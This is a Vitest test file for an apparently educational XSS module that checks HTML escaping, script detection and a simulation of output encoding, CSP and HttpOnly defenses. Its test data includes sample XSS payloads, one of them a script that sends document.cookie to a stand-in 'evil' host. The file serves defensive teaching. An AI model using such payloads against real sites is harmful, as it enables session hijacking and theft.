import { describe, it, expect } from "vitest";
import { escapeHtml, detectScript, evaluateXss, type XssDefenses } from "./xss";

const OPEN: XssDefenses = { sanitize: false, csp: false, httpOnly: false };

describe("escapeHtml", () => {
  it("neutralises the HTML metacharacters", () => {
    expect(escapeHtml("<script>alert(1)</script>")).toBe("&lt;script&gt;alert(1)&lt;/script&gt;");
    expect(escapeHtml(`a & "b" 'c'`)).toBe("a &amp; &quot;b&quot; &#39;c&#39;");
  });
});

describe("detectScript", () => {
  it("flags active content", () => {
    expect(detectScript("<script>steal()</script>")).toBe(true);
    expect(detectScript("<img src=x onerror=alert(1)>")).toBe(true);
    expect(detectScript("<a href='javascript:alert(1)'>x</a>")).toBe(true);
  });
  it("ignores benign text", () => {
    expect(detectScript("Nice article, thanks!")).toBe(false);
    expect(detectScript("5 < 10 and 10 > 5")).toBe(false);
  });
});

describe("evaluateXss", () => {
  const payload = "<script>fetch('//evil/?c='+document.cookie)</script>";

  it("executes and steals the cookie with no defenses", () => {
    const o = evaluateXss(payload, OPEN);
    expect(o.isScript).toBe(true);
    expect(o.executes).toBe(true);
    expect(o.cookieStolen).toBe(true);
    expect(o.blockedBy).toBeNull();
    expect(o.rendered).toBe(payload); // rendered raw when unsanitized
  });

  it("output encoding renders it as inert text", () => {
    const o = evaluateXss(payload, { ...OPEN, sanitize: true });
    expect(o.executes).toBe(false);
    expect(o.cookieStolen).toBe(false);
    expect(o.blockedBy).toBe("Output Encoding");
    expect(o.rendered).toContain("&lt;script&gt;");
  });

  it("CSP blocks execution entirely", () => {
    const o = evaluateXss(payload, { ...OPEN, csp: true });
    expect(o.executes).toBe(false);
    expect(o.blockedBy).toBe("Content Security Policy");
  });

  it("HttpOnly lets the script run but protects the cookie", () => {
    const o = evaluateXss(payload, { ...OPEN, httpOnly: true });
    expect(o.executes).toBe(true);
    expect(o.cookieStolen).toBe(false);
    expect(o.blockedBy).toBe("HttpOnly Cookie");
  });

  it("treats benign input as harmless", () => {
    const o = evaluateXss("Great post!", OPEN);
    expect(o.isScript).toBe(false);
    expect(o.executes).toBe(false);
    expect(o.blockedBy).toBeNull();
  });
});
